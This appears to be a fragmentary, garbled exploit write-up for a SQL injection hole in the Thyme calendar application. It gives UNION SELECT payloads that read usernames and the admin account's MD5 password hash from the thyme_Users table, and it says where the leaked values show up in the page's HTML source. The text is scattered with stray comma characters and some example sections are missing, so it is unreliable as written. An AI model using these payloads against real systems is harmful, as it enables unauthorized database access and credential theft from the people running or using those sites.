An attacker could exploit the vulnerabilit with the following ， request :  ， UNION SELECT userid ， FROM thyme_Users ， Where 'sitename' is the name of the site , and 'thyme_directory' is the ， directory in which ， Thyme is located. ， SQL QUERY ， The SQL query originally looks like this :  ， SELECT id FROM thyme_Attachments WHERE eid = 34 ， But by changing the 'eid' field we get a query that looks like this :  ， SELECT id FROM thyme_Attachments WHERE eid = 34 UNION SELECT userid FROM ， thyme_Users ， RESULT OF NEW QUERY ， The result is that the query sends back all the userid's ( actually ， usernames ) from the ， database instead of the 'id' from thyme_Attachments. You will be able to ， grab the userid's ， from the HTML source by searching for 'aid=' as this is where the attachment ， id is ， supposed to go. For example :  ， GETTING PASSWORDS ， And the password ( md5'd ) can be obtained in the same fashion :  ， UNION SELECT pass FROM ， thyme_Users ， WHERE username = \"admin\" ， In the HTML source :  ， HOW TO EXPLOIT ， Cookies should be modifiable.
